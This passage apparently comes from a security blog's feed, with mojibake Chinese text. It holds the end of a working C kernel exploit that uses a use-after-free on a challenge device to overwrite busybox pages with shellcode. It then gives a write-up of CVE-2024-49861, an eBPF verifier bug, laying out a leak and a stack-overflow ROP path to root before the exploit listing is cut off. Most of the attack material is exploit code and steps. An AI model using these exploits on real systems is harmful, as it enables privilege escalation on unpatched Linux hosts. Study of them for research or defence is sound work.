class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x78</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x97</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x78</span>,<br>    <span class="hljs-number">0x50</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0xba</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x6a</span>,<br>    <span class="hljs-number">0x01</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xEB</span>        <br>&#125;;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add_refcount</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;ADD_REF; i++)&#123;<br>        <span class="hljs-type">timer_t</span> timerid = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">sigevent_t</span> sev = &#123;<span class="hljs-number">0</span>&#125;;<br>        sev.sigev_notify = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span>(timer_create(CLOCK_REALTIME, &amp;sev, &amp;timerid) &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Timer.\n&quot;</span>);<br>        &#125;<br>    &#125;<br>    write(fd_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-number">1</span>);<br>    sleep(<span class="hljs-number">100000</span>);<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    signal(SIGCHLD, SIG_IGN);<br>    bind_core(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-type">int</span> sfd = open(<span class="hljs-string">&quot;/tmp/aaa&quot;</span>, O_CREAT | O_RDWR);<br>    write(sfd, elfcode, <span class="hljs-keyword">sizeof</span>(elfcode));<br>    lseek(sfd, <span class="hljs-number">0</span>, SEEK_SET);<br><br>    pipe(fd_pipe);<br><br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/bin/busybox&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;N_MMAP_SPRAY; i++)&#123;<br>        spray_pages[i] = mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0xdead0000</span>UL + i*<span class="hljs-number">0x1000</span>UL,<br>                            <span class="hljs-number">0x1000</span>, PROT_READ | PROT_EXEC,<br>                            MAP_FILE | MAP_SHARED, fd, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span>(spray_pages[i] == MAP_FAILED)    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Fail mmap %d.\n&quot;</span>, i);<br>    &#125;<br><br>    <span class="hljs-type">char</span> tmp = *(<span class="hljs-type">char</span> *)spray_pages[<span class="hljs-number">0</span>];<br><br>    <span class="hljs-type">int</span> fd_dev = open(<span class="hljs-string">&quot;/dev/kpid&quot;</span>, O_RDWR);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;N_PID_SPRAY; i++)&#123;<br>        <span class="hljs-keyword">if</span>(i == N_PID_DISCARD)&#123;<br>            kpid_clone(fd_dev);<br>            kpid_show(fd_dev, &amp;processes[N_PID_DISCARD]);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-number">0</span> == processes[N_PID_DISCARD])&#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Child starts.&quot;</span>);<br>                <span class="hljs-type">char</span> ch;<br>                read(fd_pipe[<span class="hljs-number">0</span>], &amp;ch, <span class="hljs-number">1</span>);<br><br>                add_refcount();<br><br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Child exits.&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>            &#125;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;kpid: %d\n&quot;</span>, processes[N_PID_DISCARD]);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;OBJS_PER_SLAB; j++)&#123;<br>            <span class="hljs-type">int</span> pid = fork();<br>            <span class="hljs-keyword">if</span>(pid)&#123;<br>                <span class="hljs-keyword">if</span>(j == <span class="hljs-number">0</span>)&#123;<br>                    processes[i] = pid;<br>                    fd_spray_cpu[i] = pidfd_open(pid, <span class="hljs-number">0</span>);<br>                    <span class="hljs-keyword">if</span>(fd_spray_cpu[i] &lt; <span class="hljs-number">0</span>)  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Fail %d, %d\n&quot;</span>, i, j);<br>                &#125;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                sleep(<span class="hljs-number">10</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Spray over. Wait...&quot;</span>);<br><br>    sleep(<span class="hljs-number">15</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wait over.&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;N_PID_DISCARD; i++)&#123;<br>        close(fd_spray_cpu[i]);<br>    &#125;<br><br>    kpid_put(fd_dev);<br>    close(fd_spray_cpu[N_PID_DISCARD+<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;N_MMAP_SPRAY; i++)&#123;<br>        tmp = *(<span class="hljs-type">char</span> *)(spray_pages[i]);<br>    &#125;<br><br>    write(fd_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-number">1</span>);<br>    read(fd_pipe[<span class="hljs-number">0</span>], &amp;tmp, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Add ref finished.&quot;</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;N_MMAP_SPRAY; i++)&#123;<br>        <span class="hljs-keyword">if</span>(pread(sfd, spray_pages[i], <span class="hljs-keyword">sizeof</span>(elfcode), <span class="hljs-number">0</span>) &gt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
      <tag>kernel</tag>
      
      <tag>heap</tag>
      
      <tag>uaf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2024-49861 eBPFéæ³•å†™å…¥</title>
    <link href="/2025/08/05/cve-2024-49861/"/>
    <url>/2025/08/05/cve-2024-49861/</url>
    
    <content type="html"><![CDATA[<p>æˆ‘éœ€è¦è¤ªé»‘ç´ </p><span id="more"></span><h1 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h1><p>å°½ç®¡ç”¨æˆ·ç©ºé—´å’ŒBPFç«¯å·²å°†BPFæ˜ å°„å†»ç»“ä¸ºåªè¯»ï¼Œä½†é€šè¿‡ç‰¹å®šhelpersä»å¯å‘å…¶å†™å…¥æ•°æ®ï¼Œå› ä¸ºè¿™äº›è¾…åŠ©å‡½æ•°çš„å‚æ•°æ ‡è®°ä¸º<code>ARG_PTR_TO_&#123;LONG,INT&#125;</code>ã€‚</p><p>protoä¸­çš„arg_typeè¡¨ç¤ºhelperå¯¹å‚æ•°çš„è¦æ±‚ä»¥åŠhelperä¼šå¯¹å‚æ•°è¿›è¡Œçš„æ“ä½œã€‚æ¯”å¦‚åœ¨bpf_strtolçš„ä¾‹å­ä¸­ï¼Œarg1éœ€ä¸ºä¸€ä¸ªæŒ‡é’ˆï¼Œhelperåªå¯¹è¯¥å†…å­˜è¿›è¡Œè¯»å–ã€‚</p><p>å¦‚æœéœ€è¦å¯¹å†…å­˜è¿›è¡Œå†™å…¥ï¼Œéœ€è¦é¢å¤–æ ‡è®°MEM_UNINITï¼Œè¡¨æ˜å…è®¸ä¼ é€’æœªåˆå§‹åŒ–å†…å­˜çš„æŒ‡é’ˆï¼Œå› ä¸ºåç»­ä¼šå†™å…¥æ•°æ®ã€‚ä½†<code>ARG_PTR_TO_&#123;LONG,INT&#125;</code>æœ¬è´¨ä¸Šæ˜¯ARG_PTR_TO_FIXED_SIZE_MEMçš„ç‰¹ä¾‹ï¼ˆé¢å¤–è¦æ±‚å¯¹é½ï¼‰ï¼Œå¹¶æ— MEM_UNINITçš„æ ‡è®°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_func_proto</span> <span class="hljs-title">bpf_strtol_proto</span> =</span> &#123;<br>.func= bpf_strtol,<br>.gpl_only= <span class="hljs-literal">false</span>,<br>.ret_type= RET_INTEGER,<br>.arg1_type= ARG_PTR_TO_MEM | MEM_RDONLY,<br>.arg2_type= ARG_CONST_SIZE,<br>.arg3_type= ARG_ANYTHING,<br>.arg4_type= ARG_PTR_TO_LONG,<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">BPF_CALL_4(bpf_strtol, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *, buf, <span class="hljs-type">size_t</span>, buf_len, u64, flags,<br>   s64 *, res)<br>&#123;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> _res;<br><span class="hljs-type">int</span> err;<br><br>err = __bpf_strtoll(buf, buf_len, flags, &amp;_res);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> err;<br>*res = _res;<br><span class="hljs-keyword">return</span> err;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨check_func_argä¸­ï¼Œå½“å‚æ•°ç±»å‹ä¸º<code>ARG_PTR_TO_&#123;LONG,INT&#125;</code>æ—¶ï¼Œmeta-&gt;raw_modeæœªè¢«è®¾ç½®ã€‚éšåï¼Œåœ¨check_helper_mem_accessä¸­ï¼Œè‹¥å¯„å­˜å™¨åŸºç±»å‹ä¸ºPTR_TO_MAP_VALUEï¼Œè¯¥å‡½æ•°ä¼šé»˜è®¤å‡è®¾æ“ä½œä¸ºBPF_READï¼ˆhelperåªä¼šå¯¹å†…å­˜è¿›è¡Œè¯»å–ï¼‰å¹¶è°ƒç”¨check_map_access_typeã€‚BPFæ˜ å°„æ˜¯åªè¯»çš„ï¼Œæ£€æŸ¥ä¼šé”™è¯¯åœ°é€šè¿‡ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">case</span> PTR_TO_MAP_VALUE:<br>    <span class="hljs-keyword">if</span> (check_map_access_type(env, regno, reg-&gt;off, access_size,<br>                    meta &amp;&amp; meta-&gt;raw_mode ? BPF_WRITE :<br>                    BPF_READ)) <span class="hljs-comment">// meta-&gt;raw_mode not set</span><br>        <span class="hljs-keyword">return</span> -EACCES;<br>    <span class="hljs-keyword">return</span> check_map_access(env, regno, reg-&gt;off, access_size,<br>                zero_size_allowed, ACCESS_HELPER);<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">check_map_access_type</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_verifier_env *env, u32 regno,</span><br><span class="hljs-params"> <span class="hljs-type">int</span> off, <span class="hljs-type">int</span> size, <span class="hljs-keyword">enum</span> bpf_access_type type)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_reg_state</span> *<span class="hljs-title">regs</span> =</span> cur_regs(env);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> *<span class="hljs-title">map</span> =</span> regs[regno].map_ptr;<br>u32 cap = bpf_map_flags_to_cap(<span class="hljs-built_in">map</span>);<br><br><span class="hljs-keyword">if</span> (type == BPF_WRITE &amp;&amp; !(cap &amp; BPF_MAP_CAN_WRITE)) &#123;<br>verbose(env, <span class="hljs-string">&quot;write into map forbidden, value_size=%d off=%d size=%d\n&quot;</span>,<br><span class="hljs-built_in">map</span>-&gt;value_size, off, size);<br><span class="hljs-keyword">return</span> -EACCES;<br>&#125;<br><br><span class="hljs-keyword">if</span> (type == BPF_READ &amp;&amp; !(cap &amp; BPF_MAP_CAN_READ)) &#123;<br>verbose(env, <span class="hljs-string">&quot;read from map forbidden, value_size=%d off=%d size=%d\n&quot;</span>,<br><span class="hljs-built_in">map</span>-&gt;value_size, off, size);<br><span class="hljs-keyword">return</span> -EACCES;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h1><p>ä¸»è¦çš„åˆ©ç”¨æ€è·¯æ˜¯å…ˆå†™å…¥mapä¸€ä¸ªvalueï¼Œç„¶åfreezeè¿™ä¸ªmapã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">exp_fd = bpf_map_create(BPF_MAP_TYPE_ARRAY, <span class="hljs-number">4</span>, <span class="hljs-number">16</span>, <span class="hljs-number">1</span>, BPF_F_RDONLY_PROG);<br><span class="hljs-keyword">if</span> (exp_fd &lt; <span class="hljs-number">0</span>) perror(<span class="hljs-string">&quot;BPF_MAP_CREATE&quot;</span>), err_exit(<span class="hljs-string">&quot;BPF_MAP_CREATE&quot;</span>);<br><br><span class="hljs-type">int</span> key = <span class="hljs-number">0</span>;<br>buffer[<span class="hljs-number">0</span>] = <span class="hljs-number">0x10000</span>;<br>bpf_map_update_elem(exp_fd, &amp;key, buffer);<br><br>bpf_map_freeze(exp_fd);<br></code></pre></td></tr></table></figure><p>ä¹‹åé€šè¿‡ä¸Šè¿°æ¼æ´æ›´æ”¹æ•°å€¼ã€‚ç”±äºmapåªè¯»é»˜è®¤ä¸ä¼šæ”¹å˜ï¼Œæ‰€ä»¥åœ¨load ebpfç¨‹åºæ—¶ä¼šç›´æ¥ä½¿ç”¨åŸå§‹å€¼è¿›è¡Œæ£€æŸ¥ï¼Œä½†æ•°å€¼å®é™…ä¸Šå‘ç”Ÿäº†æ”¹å˜ï¼Œåˆ©ç”¨æ•°å€¼ä¸ä¸€è‡´å¯ä»¥è¿›è¡Œè¶Šç•Œè¯»å†™ã€‚</p><h2 id="Leak"><a href="#Leak" class="headerlink" title="Leak"></a>Leak</h2><p>ebpf ringbufå…è®¸åœ¨ç¨‹åºä¸­è¿›è¡Œå†…å­˜çš„ç”³è¯·ã€‚å…ˆå†™å…¥0x10000å†æ”¹æˆ0x100ï¼Œè¿™æ ·å®é™…ç”³è¯·çš„å¤§å°æ˜¯0x100ï¼Œä½†verifierè®¤ä¸ºå¤§å°ä¸º0x10000ï¼Œè¿™æ ·0~0x10000ä¹‹é—´çš„è¯»å†™åç§»éƒ½ä¼šé€šè¿‡ã€‚</p><p>bpf_ringbuf_reserveç”³è¯·çš„å†…å­˜ä¹‹é—´çš„é—´è·æ˜¯å›ºå®šçš„ï¼Œå¯ä»¥ç”³è¯·ä¸¤å—å†…å­˜ï¼Œåˆ©ç”¨ç¬¬ä¸€å—å†…å­˜è¶Šç•Œè¯»å†™ç¬¬äºŒå—å†…å­˜çš„å†…å®¹ï¼Œæ³„éœ²å†…æ ¸åŸºå€ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">|-------------------| high<br>|     ringbuf_2     |<br>|-------------------|<br>|     hole        |<br>|-------------------|<br>|     ringbuf_1     |<br>|-------------------| low<br></code></pre></td></tr></table></figure><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>å†™å…¥8å†æ”¹æˆ0x200ï¼Œskb_load_byteså‘æ ˆä¸Šå†™æ•°æ®ï¼Œè¿™æ ·å®é™…å†™å…¥å¤§å°ä¸º0x200ä½†verifierè®¤ä¸ºæ˜¯8ï¼Œé€ æˆæ ˆæº¢å‡ºã€‚ROPææƒã€‚</p><h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span 